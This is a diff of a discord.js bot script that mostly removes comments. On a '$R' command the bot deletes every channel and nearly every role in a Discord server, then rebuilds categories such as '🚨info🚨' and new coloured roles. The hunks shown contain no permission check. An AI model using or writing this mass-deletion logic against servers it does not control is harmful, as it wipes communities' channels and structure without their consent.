@@ -1,7 +1,6 @@
 const { Client, GatewayIntentBits, ChannelType } = require('discord.js');
 const fs = require('fs');
 
-// Load the configuration
 const config = JSON.parse(fs.readFileSync('./config.json', 'utf8'));
 
 const client = new Client({
@@ -25,7 +24,6 @@ client.on('messageCreate', async message => {
 
         console.log(`Received $R command from ${message.author.tag}`);
         
-        // Delete all channels
         const channels = message.guild.channels.cache;
         for (const channel of channels.values()) {
             try {
@@ -36,24 +34,24 @@ client.on('messageCreate', async message => {
             }
         }
 
-        // Wait for all channels to be deleted
-        await new Promise(resolve => setTimeout(resolve, 5000)); // Adjust delay as needed
 
-        // Delete all roles except the @everyone role
+        await new Promise(resolve => setTimeout(resolve, 5000));
+
+
         const roles = message.guild.roles.cache.filter(role => role.name !== '@everyone');
         for (const role of roles.values()) {
             try {
                 if (role.managed) {
                     console.log(`Skipping bot role ${role.name}.`);
-                    continue; // Skip roles managed by bots
+                    continue; 
                 }
 
                 await role.delete();
                 console.log(`Deleted ${role.name} role.`);
             } catch (error) {
-                if (error.code === 50013) { // Missing Permissions error
+                if (error.code === 50013) { 
                     console.error(`Cannot delete role ${role.name}. Missing permissions.`);
-                } else if (error.code === 50028) { // Invalid Role error
+                } else if (error.code === 50028) { 
                     console.error(`Cannot delete role ${role.name}. Invalid role.`);
                 } else {
                     console.error(`Error deleting role ${role.name}:`, error);
@@ -61,10 +59,7 @@ client.on('messageCreate', async message => {
             }
         }
 
-        // Wait for all roles to be deleted
-        await new Promise(resolve => setTimeout(resolve, 5000)); // Adjust delay as needed
-
-        // Create new category and channels
+        await new Promise(resolve => setTimeout(resolve, 5000)); 
         try {
             const category = await message.guild.channels.create({
                 name: '🚨info🚨',
@@ -89,7 +84,6 @@ client.on('messageCreate', async message => {
                 parent: category.id
             });
 
-                        // Create the 'Main Channels' category
                         const mainCategory = await message.guild.channels.create({
                             name: 'Main Channels',
                             type: ChannelType.GuildCategory
@@ -113,7 +107,6 @@ client.on('messageCreate', async message => {
                             parent: mainCategory.id
                         });
 
-            // Create new roles with hexadecimal color codes
             const newRoles = [
                 { name: 'Owner', color: '#FF0000' }, // Red
                 { name: 'Server Member', color: '#0000FF' }, // Blue
